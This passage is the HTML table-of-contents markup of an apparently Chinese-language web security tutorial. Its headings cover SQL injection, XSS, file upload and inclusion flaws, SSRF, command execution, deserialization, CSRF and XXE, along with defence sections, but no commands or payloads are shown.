<span class="toc-text">堆叠注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">1.6.5.</span> <span class="toc-text">盲注方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E5%B8%83%E5%B0%94%E7%B1%BB%E5%9E%8B%E7%9A%84SQL%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.6.5.1.</span> <span class="toc-text">基于布尔类型的SQL盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%B1%BB%E5%9E%8B%E7%9A%84SQL%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.6.5.2.</span> <span class="toc-text">基于时间类型的SQL盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DNSlog%E6%B3%A8%E5%85%A5"><span class="toc-number">1.6.5.3.</span> <span class="toc-text">DNSlog注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">1.6.6.</span> <span class="toc-text">宽字节注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E6%88%98%E5%BA%94%E7%94%A8"><span class="toc-number">1.7.</span> <span class="toc-text">实战应用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B%E7%A1%AE%E8%AE%A4%E6%96%B9%E5%BC%8F"><span class="toc-number">1.7.1.</span> <span class="toc-text">数据库类型确认方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%86%85%E7%BD%AE%E5%8F%98%E9%87%8F%E7%88%86%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.7.1.1.</span> <span class="toc-text">使用内置变量爆数据库类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E7%BD%AE%E6%95%B0%E6%8D%AE%E8%A1%A8%E7%88%86%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.7.1.2.</span> <span class="toc-text">内置数据表爆数据库类型</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Access"><span class="toc-number">1.7.2.</span> <span class="toc-text">Access</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%AD%A5%E9%AA%A4"><span class="toc-number">1.7.2.1.</span> <span class="toc-text">注入步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%88%86%E5%87%BA%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.7.2.1.1.</span> <span class="toc-text">爆出数据库类型</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%8C%9C%E8%A7%A3%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A1%A8%E5%90%8D"><span class="toc-number">1.7.2.1.2.</span> <span class="toc-text">猜解数据库表名</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%8C%9C%E8%A7%A3%E8%A1%A8%E5%AD%97%E6%AE%B5%E5%90%8D%E5%8F%8A%E9%95%BF%E5%BA%A6"><span class="toc-number">1.7.2.1.3.</span> <span class="toc-text">猜解表字段名及长度</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%8C%9C%E8%A7%A3%E5%AD%97%E6%AE%B5%E5%80%BC"><span class="toc-number">1.7.2.1.4.</span> <span class="toc-text">猜解字段值</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Access%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B"><span class="toc-number">1.7.2.2.</span> <span class="toc-text">Access注入实战案例</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%8C%9C%E8%A7%A3%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A1%A8%E5%90%8D%E5%92%8C%E5%AD%97%E6%AE%B5"><span class="toc-number">1.7.2.2.1.</span> <span class="toc-text">猜解数据库表名和字段</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%8C%9C%E8%A7%A3%E5%AD%97%E6%AE%B5%E9%95%BF%E5%BA%A6"><span class="toc-number">1.7.2.2.2.</span> <span class="toc-text">猜解字段长度</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%8C%9C%E8%A7%A3%E5%AD%97%E6%AE%B5%E5%86%85%E5%AE%B9"><span class="toc-number">1.7.2.2.3.</span> <span class="toc-text">猜解字段内容</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%90%8E%E5%8F%B0%E7%B3%BB%E7%BB%9F"><span class="toc-number">1.7.2.2.4.</span> <span class="toc-text">获取后台系统</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mysql"><span class="toc-number">1.7.3.</span> <span class="toc-text">Mysql</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Mysql%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B"><span class="toc-number">1.7.3.1.</span> <span class="toc-text">Mysql实战案例</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">1.7.3.1.1.</span> <span class="toc-text">检查注入点</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%9F%A5%E8%AF%A2%E5%AD%97%E6%AE%B5%E6%95%B0"><span class="toc-number">1.7.3.1.2.</span> <span class="toc-text">判断查询字段数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%BD%91%E7%AB%99%E4%B8%9A%E5%8A%A1%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%A7%B0"><span class="toc-number">1.7.3.1.3.</span> <span class="toc-text">获取网站业务数据库名称</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96dvwa%E8%A1%A8%E5%90%8D"><span class="toc-number">1.7.3.1.4.</span> <span class="toc-text">获取dvwa表名</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%A1%A8%E9%87%8C%E7%9A%84%E5%AD%97%E6%AE%B5%E5%80%BC"><span class="toc-number">1.7.3.1.5.</span> <span class="toc-text">获取表里的字段值</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E5%86%85%E5%AE%B9"><span class="toc-number">1.7.3.1.6.</span> <span class="toc-text">获取字段内容</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%9B%E4%B8%80%E6%AD%A5%E6%B8%97%E9%80%8F"><span class="toc-number">1.7.3.1.7.</span> <span class="toc-text">进一步渗透</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MsSQL"><span class="toc-number">1.7.4.</span> <span class="toc-text">MsSQL</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SA%E7%94%A8%E6%88%B7%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="toc-number">1.7.4.1.</span> <span class="toc-text">_SA用户攻击方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dbowner%E7%94%A8%E6%88%B7%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="toc-number">1.7.4.2.</span> <span class="toc-text">_dbowner用户攻击方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#public%E7%94%A8%E6%88%B7%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="toc-number">1.7.4.3.</span> <span class="toc-text">_public用户攻击方式</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD"><span class="toc-number">1.8.</span> <span class="toc-text">防御措施</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7"><span class="toc-number">1.9.</span> <span class="toc-text">SQL注入工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQLMAP"><span class="toc-number">1.9.1.</span> <span class="toc-text">SQLMAP</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB"><span class="toc-number">2.</span> <span class="toc-text">XSS跨站脚本攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">2.1.</span> <span class="toc-text">基础知识</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.</span> <span class="toc-text">文件上传下载漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.1.</span> <span class="toc-text">文件上传漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="toc-number">3.1.1.</span> <span class="toc-text">漏洞概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><span class="toc-number">3.1.2.</span> <span class="toc-text">漏洞挖掘</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BD%BF%E7%94%A8"><span class="toc-number">3.1.3.</span> <span class="toc-text">漏洞使用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.2.</span> <span class="toc-text">中间件解析漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#IIS%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.2.1.</span> <span class="toc-text">IIS解析漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.2.1.1.</span> <span class="toc-text">目录解析漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%90%8D%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.2.1.2.</span> <span class="toc-text">文件名解析漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%95%B8%E5%BD%A2%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.2.1.3.</span> <span class="toc-text">畸形解析漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#IIS7-5%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90"><span class="toc-number">3.2.1.4.</span> <span class="toc-text">IIS7.5漏洞解析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.2.2.</span> <span class="toc-text">Apache解析漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.2.3.</span> <span class="toc-text">Nginx解析漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.3.</span> <span class="toc-text">文件下载漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D"><span class="toc-number">3.3.1.</span> <span class="toc-text">漏洞介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">3.3.2.</span> <span class="toc-text">利用方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD-1"><span class="toc-number">3.3.3.</span> <span class="toc-text">防御措施</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.</span> <span class="toc-text">文件包含漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-1"><span class="toc-number">4.1.</span> <span class="toc-text">基础知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9ELFI"><span class="toc-number">4.2.</span> <span class="toc-text">本地包含漏洞LFI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">4.2.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7"><span class="toc-number">4.2.2.</span> <span class="toc-text">利用技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%85%8D%E5%90%88%E6%96%87%E4%BB%B6%E8%BF%9B%E8%A1%8C%E4%B8%8A%E4%BC%A0"><span class="toc-number">4.2.2.1.</span> <span class="toc-text">配合文件进行上传</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8C%85%E5%90%ABApache%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6"><span class="toc-number">4.2.2.2.</span> <span class="toc-text">包含Apache日志文件</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABRFI"><span class="toc-number">4.3.</span> <span class="toc-text">远程文件包含RFI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">4.4.</span> <span class="toc-text">PHP伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#file-%E5%8D%8F%E8%AE%AE"><span class="toc-number">4.4.1.</span> <span class="toc-text">file:&#x2F;&#x2F;协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-%E5%8D%8F%E8%AE%AE"><span class="toc-number">4.4.2.</span> <span class="toc-text">php:&#x2F;&#x2F;协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ZIP-%E5%8D%8F%E8%AE%AE"><span class="toc-number">4.4.3.</span> <span class="toc-text">ZIP:&#x2F;&#x2F;协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#data-%E5%8D%8F%E8%AE%AE"><span class="toc-number">4.4.4.</span> <span class="toc-text">data:&#x2F;&#x2F;协议</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E9%98%B2%E6%8A%A4"><span class="toc-number">4.5.</span> <span class="toc-text">文件包含漏洞防护</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF%E8%B7%A8%E7%AB%99%E4%BC%AA%E9%80%A0%E8%AF%B7%E6%B1%82"><span class="toc-number">5.</span> <span class="toc-text">SSRF跨站伪造请求</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-2"><span class="toc-number">5.1.</span> <span class="toc-text">基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF%E5%8E%9F%E7%90%86"><span class="toc-number">5.1.1.</span> <span class="toc-text">SSRF原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF%E4%BA%A7%E7%94%9F%E5%8E%9F%E5%9B%A0"><span class="toc-number">5.1.2.</span> <span class="toc-text">SSRF产生原因</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-1"><span class="toc-number">5.2.</span> <span class="toc-text">漏洞挖掘</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%87%BD%E6%95%B0"><span class="toc-number">5.3.</span> <span class="toc-text">漏洞函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#file-get-contents"><span class="toc-number">5.3.1.</span> <span class="toc-text">file_get_contents()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sockopen"><span class="toc-number">5.3.2.</span> <span class="toc-text">sockopen()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#curl-exec"><span class="toc-number">5.3.3.</span> <span class="toc-text">curl_exec()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#URL%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">5.4.</span> <span class="toc-text">URL伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#file"><span class="toc-number">5.4.1.</span> <span class="toc-text">file</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dict"><span class="toc-number">5.4.2.</span> <span class="toc-text">dict</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sftp"><span class="toc-number">5.4.3.</span> <span class="toc-text">sftp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gopher"><span class="toc-number">5.4.4.</span> <span class="toc-text">gopher</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">5.5.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="toc-number">5.6.</span> <span class="toc-text">绕过方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%98%B2%E5%BE%A1"><span class="toc-number">5.7.</span> <span class="toc-text">漏洞防御</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B"><span class="toc-number">5.8.</span> <span class="toc-text">实战案例</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">6.</span> <span class="toc-text">命令执行漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D-1"><span class="toc-number">6.1.</span> <span class="toc-text">漏洞介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">6.2.</span> <span class="toc-text">可能存在漏洞的函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E7%B3%BB%E7%BB%9F%E5%87%BD%E6%95%B0%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">6.2.1.</span> <span class="toc-text">利用系统函数实现远程命令执行的函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">6.2.2.</span> <span class="toc-text">直接执行系统命令的函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%8B%BC%E6%8E%A5%E7%AC%A6"><span class="toc-number">6.3.</span> <span class="toc-text">命令拼接符</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%8B%BC%E6%8E%A5%E7%AC%A6"><span class="toc-number">6.3.1.</span> <span class="toc-text">Windows常用命令拼接符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E7%9A%84%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%8B%BC%E6%8E%A5%E7%AC%A6"><span class="toc-number">6.3.2.</span> <span class="toc-text">Linux的系统命令拼接符</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F-1"><span class="toc-number">6.4.</span> <span class="toc-text">绕过方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">6.4.1.</span> <span class="toc-text">编码绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%AB%E8%BF%9B%E5%88%B6%E7%BB%95%E8%BF%87"><span class="toc-number">6.4.2.</span> <span class="toc-text">八进制绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="toc-number">6.4.3.</span> <span class="toc-text">十六进制字符绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4"><span class="toc-number">6.4.4.</span> <span class="toc-text">空格过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E8%AF%8D%E7%BB%95%E8%BF%87"><span class="toc-number">6.4.5.</span> <span class="toc-text">关键词绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A9%BA%E5%8F%98%E9%87%8F"><span class="toc-number">6.4.6.</span> <span class="toc-text">空变量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8A%B1%E6%8B%AC%E5%8F%B7%E7%9A%84%E7%94%A8%E6%B3%95"><span class="toc-number">6.4.7.</span> <span class="toc-text">花括号的用法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">6.4.8.</span> <span class="toc-text">无回显的命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E6%96%87%E4%BB%B6%E5%91%BD%E4%BB%A4"><span class="toc-number">6.4.9.</span> <span class="toc-text">读文件命令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">6.5.</span> <span class="toc-text">反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E8%8C%83%E6%8E%AA%E6%96%BD"><span class="toc-number">6.6.</span> <span class="toc-text">防范措施</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">7.</span> <span class="toc-text">反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-3"><span class="toc-number">7.1.</span> <span class="toc-text">基础知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E8%8C%83%E6%8E%AA%E6%96%BD-1"><span class="toc-number">7.2.</span> <span class="toc-text">防范措施</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CSRF%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BC%AA%E9%80%A0%E8%AF%B7%E6%B1%82"><span class="toc-number">8.</span> <span class="toc-text">CSRF客户端伪造请求</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D-2"><span class="toc-number">8.1.</span> <span class="toc-text">漏洞介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">8.2.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E7%B1%BB"><span class="toc-number">8.3.</span> <span class="toc-text">漏洞分类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GET%E7%B1%BB%E5%9E%8B"><span class="toc-number">8.3.1.</span> <span class="toc-text">GET类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POST%E7%B1%BB%E5%9E%8B"><span class="toc-number">8.3.2.</span> <span class="toc-text">POST类型</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-2"><span class="toc-number">8.4.</span> <span class="toc-text">漏洞挖掘</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%98%B2%E5%BE%A1-1"><span class="toc-number">8.5.</span> <span class="toc-text">漏洞防御</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E7%A0%81"><span class="toc-number">8.5.1.</span> <span class="toc-text">验证码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8%E8%AF%B7%E6%B1%82%E5%9C%B0%E5%9D%80%E4%B8%AD%E6%B7%BB%E5%8A%A0-token-%E5%B9%B6%E9%AA%8C%E8%AF%81"><span class="toc-number">8.5.2.</span> <span class="toc-text">在请求地址中添加 token 并验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81-HTTP-Referer-%E5%AD%97%E6%AE%B5"><span class="toc-number">8.5.3.</span> <span class="toc-text">验证 HTTP Referer 字段</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XXE%E6%BC%8F%E6%B4%9E"><span class="toc-number">9.</span> <span class="toc-text">XXE漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE%E4%BB%8B%E7%BB%8D"><span class="toc-number">9.1.</span> <span class="toc-text">XXE介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XML%E8%AF%AD%E6%B3%95"><span class="toc-number">9.1.1.</span> <span class="toc-text">XML语法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#XML%E6%96%87%E6%A1%A3%E5%A3%B0%E6%98%8E"><span class="toc-number">9.1.1.1.</span> <span class="toc-text">XML文档声明</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DTD%E6%96%87%E6%A1%A3%E7%B1%BB%E5%9E%8B"><span class="toc-number">9.1.1.2.</span> <span class="toc-text">DTD文档类型</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#DTD%E6%96%87%E6%A1%A3%E4%B8%AD%E7%9A%84%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-number">9.1.1.2.1.</span> <span class="toc-text">DTD文档中的关键字</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DTD%E5%A3%B0%E6%98%8E%E7%B1%BB%E5%9E%8B"><span class="toc-number">9.1.1.3.</span> <span class="toc-text">DTD声明类型</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%86%85%E9%83%A8%E5%A3%B0%E6%98%8E"><span class="toc-number">9.1.1.3.1.</span> <span class="toc-text">内部声明</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A4%96%E9%83%A8%E5%A3%B0%E6%98%8E"><span class="toc-number">9.1.1.3.2.</span> <span class="toc-text">外部声明</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" 